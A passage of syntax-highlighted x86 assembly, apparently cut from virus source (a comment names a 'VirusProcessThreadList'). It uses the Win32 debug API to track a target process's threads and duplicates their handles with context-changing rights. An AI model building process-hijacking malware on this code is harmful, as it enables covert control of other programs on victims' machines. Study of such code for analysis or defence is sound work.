                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_ContinueDebugEvent</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">AlreadyUnderDebug</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Handle PROCESS CREATION</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Save each ThreadId/hThread pair on a list</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  esi &lt;- Ptr to debug event structure</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Declaration of a debug event that notifies</span><span class="sc0">
                </span><span class="sc1">;of process creation on target process</span><span class="sc0">

</span><span class="sc5">DEBUG_EVENT__CREATE_PROCESS</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">

</span><span class="sc5">DECP_dwProcessId</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DECP_dwThreadId</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">DECP_hFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">DECP_hProcess</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DECP_hThread</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DECP_lpBaseOfImage</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DECP_dwDebugInfoFileOffset</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DECP_nDebugInfoSize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DECP_lpThreadLocalBase</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DECP_lpStartAddress</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DECP_lpImageName</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DECP_fUnicode</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">DEBUG_EVENT__CREATE_PROCESS</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">STANDARD_RIGHTS_REQUIRED</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">000F0000h</span><span class="sc0">
</span><span class="sc5">SYNCHRONIZE</span><span class="sc0">                     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00100000h</span><span class="sc0">

</span><span class="sc5">PROCESS_ALL_ACCESS</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">STANDARD_RIGHTS_REQUIRED</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">     \
                    </span><span class="sc5">SYNCHRONIZE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">              \
                    </span><span class="sc2">00000FFFh</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">HandleProcessCreation</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">   </span><span class="sc1">;dwProcessId</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0"> </span><span class="sc1">;Move to hProcess</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">SkipTargetCreation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TargetProcessID</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">SkipTargetCreation</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PROCESS_ALL_ACCESS</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hTargetProcess</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_GetCurrentProcess</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_DuplicateHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">DebugCreateProcInvalidHandle</span><span class="sc0">

</span><span class="sc5">SkipTargetCreation</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">       </span><span class="sc1">;hProcess</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">       </span><span class="sc1">;hThread</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">DebugCreateProcInvalidHandle</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AddThread</span><span class="sc0">

</span><span class="sc5">DebugCreateProcInvalidHandle</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ContinueDebug</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Handle PROCESS DESTRUCTION</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Delete ThreadId/hThread pair from the list</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Declaration of a debug event that notifies</span><span class="sc0">
                </span><span class="sc1">;of process destruction on target process</span><span class="sc0">

</span><span class="sc5">DEBUG_EVENT__EXIT_PROCESS</span><span class="sc0">   </span><span class="sc9">struc</span><span class="sc0">

</span><span class="sc5">DEEP_dwProcessId</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DEEP_dwThreadId</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">DEEP_dwExitCode</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">DEBUG_EVENT__EXIT_PROCESS</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">HandleProcessDestruction</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeleteThread</span><span class="sc0">

                </span><span class="sc1">;****cmp eax,dword ptr [ProcessThreadList+00000004h]</span><span class="sc0">
                </span><span class="sc1">;****jne ContinueDebug</span><span class="sc0">

</span><span class="sc5">ExitDebugThread</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_ExitThread</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Handle THREAD CREATION</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Save ThreadId/hThread pair on a list</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Declaration of a debug event that notifies</span><span class="sc0">
                </span><span class="sc1">;of thread creation on target process</span><span class="sc0">

</span><span class="sc5">DEBUG_EVENT__CREATE_THREAD</span><span class="sc0">  </span><span class="sc9">struc</span><span class="sc0">

</span><span class="sc5">DECT_dwProcessId</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DECT_dwThreadId</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">DECT_hThread</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DECT_lpThreadLocalBase</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DECT_lpStartAddress</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">DEBUG_EVENT__CREATE_THREAD</span><span class="sc0">  </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">HandleThreadCreation</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">DEBUG_EVENT__CREATE_THREAD.DECT_hThread</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">DebugCreateThreadInvalidHandle</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AddThread</span><span class="sc0">

</span><span class="sc5">DebugCreateThreadInvalidHandle</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ContinueDebug</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Handle THREAD DESTRUCTION</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Delete ThreadId/hThread pair from the list</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Declaration of a debug event that notifies</span><span class="sc0">
                </span><span class="sc1">;of thread destruction on target process</span><span class="sc0">

</span><span class="sc5">DEBUG_EVENT__EXIT_THREAD</span><span class="sc0">    </span><span class="sc9">struc</span><span class="sc0">

</span><span class="sc5">DEET_dwProcessId</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DEET_dwThreadId</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">DEET_dwExitCode</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">DEBUG_EVENT__EXIT_THREAD</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">HandleThreadDestruction</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeleteThread</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ContinueDebug</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Add thread handle to the list</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  edx &lt;- Thread handle</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">THREAD_TERMINATE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">THREAD_SUSPEND_RESUME</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">THREAD_GET_CONTEXT</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000008h</span><span class="sc0">
</span><span class="sc5">THREAD_SET_CONTEXT</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000010h</span><span class="sc0">
</span><span class="sc5">THREAD_SET_INFORMATION</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000020h</span><span class="sc0">
</span><span class="sc5">THREAD_QUERY_INFORMATION</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000040h</span><span class="sc0">
</span><span class="sc5">THREAD_SET_THREAD_TOKEN</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0">
</span><span class="sc5">THREAD_IMPERSONATE</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000100h</span><span class="sc0">
</span><span class="sc5">THREAD_DIRECT_IMPERSONATION</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000200h</span><span class="sc0">

</span><span class="sc5">THREAD_ALL_ACCESS</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">STANDARD_RIGHTS_REQUIRED</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">     \
                    </span><span class="sc5">SYNCHRONIZE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">              \
                    </span><span class="sc2">000003FFh</span><span class="sc0">

</span><span class="sc5">AddThread</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ProcessThreadList</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DebugEventInfo</span><span class="sc4">+</span><span class="sc2">00000008h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">MAX_NUMBER_OF_THREADS</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">SearchForFreePairOnProcess</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FoundFreePair</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">SearchForFreePairOnProcess</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FoundFreePair</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">movsd</span><span class="sc0">           </span><span class="sc1">;Copy dwThreadId</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">THREAD_TERMINATE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">         \
                    </span><span class="sc5">THREAD_SUSPEND_RESUME</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">        \
                    </span><span class="sc5">THREAD_GET_CONTEXT</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">           \
                    </span><span class="sc5">THREAD_SET_CONTEXT</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">           \
                    </span><span class="sc5">THREAD_SET_INFORMATION</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">       \
                    </span><span class="sc5">THREAD_QUERY_INFORMATION</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">     \
                    </span><span class="sc5">STANDARD_RIGHTS_REQUIRED</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">     \
                    </span><span class="sc5">SYNCHRONIZE</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_GetCurrentProcess</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_DuplicateHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">HandleDuplicateSucess</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc5">HandleDuplicateSucess</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Delete thread handle from the list</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:   eax -&gt; Handle of deleted thread or NULL if error</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">DeleteThread</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DebugEventInfo</span><span class="sc4">+</span><span class="sc2">00000008h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ThreadIdNotFoundOnList</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetThreadHandleFromThreadId</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ThreadIdNotFoundOnList</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_CloseHandle</span><span class="sc4">]</span><span class="sc0">
                                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">       </span><span class="sc1">;Delete table entrie</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">ThreadIdNotFoundOnList</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Get thread handle from thread id</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  edx &lt;- ThreadId</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:   eax -&gt; hThread or NULL if not found</span><span class="sc0">
</span><span class="sc1">;       esi -&gt; Ptr to VirusProcessThreadList entrie</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">GetThreadHandleFromThreadId</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ProcessThreadList</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">MAX_NUMBER_OF_THREADS</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">SearchForThreadId</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotThisThreadId</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ThreadIdFound</span><span class="sc0">
</span><span class="sc5">NotThisThreadId</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">SearchForThreadId</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">ThreadIdFound</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Handle EXCEPTION debug event</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Declaration of a debug event that notifies</span><span class="sc0">
                </span><span class="sc1">;of a exception on target process</span><span class="sc0">

</span><span class="sc5">DEBUG_EVENT__EXCEPTION</span><span class="sc0">      </span><span class="sc9">struc</span><span class="sc0">

</span><span class="sc5">DEE_dwProcessId</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DEE_dwThreadId</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">DEE_ExceptionRecord</span><span class="sc0">     </span><span class="sc5">EXCEPTION_RECORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DEE_dwFirstChance</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

